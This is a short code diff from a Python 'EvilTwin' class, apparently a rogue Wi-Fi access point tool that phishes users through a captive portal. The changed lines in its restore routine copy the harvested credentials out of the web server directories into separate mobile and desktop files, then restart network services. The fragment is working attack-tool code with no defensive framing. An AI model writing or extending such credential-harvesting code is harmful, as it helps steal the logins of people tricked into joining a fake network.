@@ -91,7 +91,8 @@ class EvilTwin:
         print ("restore system....\n")
 
         # salva i dati direttamente
-        os.system('cp /var/www/html/captive/credentials.txt credentials.txt > /dev/null 2>&1')
+        os.system('cp /var/www/html/captive/credentials.txt credentials-mobile.txt > /dev/null 2>&1')
+        os.system('cp /var/www/html/credentials.txt credentials-desktop.txt > /dev/null 2>&1')
 
         os.system('systemctl start systemd-resolved > /dev/null 2>&1')
         os.system('service NetworkManager start > /dev/null 2>&1')
